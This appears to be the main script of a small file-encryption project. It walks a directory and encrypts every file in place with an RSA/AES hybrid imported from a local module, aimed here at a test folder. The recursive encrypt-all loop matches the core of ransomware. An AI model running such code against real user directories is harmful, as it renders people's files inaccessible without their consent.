#!/usr/bin/env python

import os
from src import encrypt
from src import decrypt
from src import logger


def main(rootdir):
    rsa_aes = encrypt.RSAAESEncryption()
    for subdir, _, files in os.walk(rootdir):
        for file in files:
            fpath = os.path.abspath(os.path.join(subdir, file))
            rsa_aes.encrypt(fpath)
            logger.info(f"Encrypted file: {fpath}")


if __name__ == '__main__':
    main("tests/to_encrypt/subfolder/subsubfolder/")
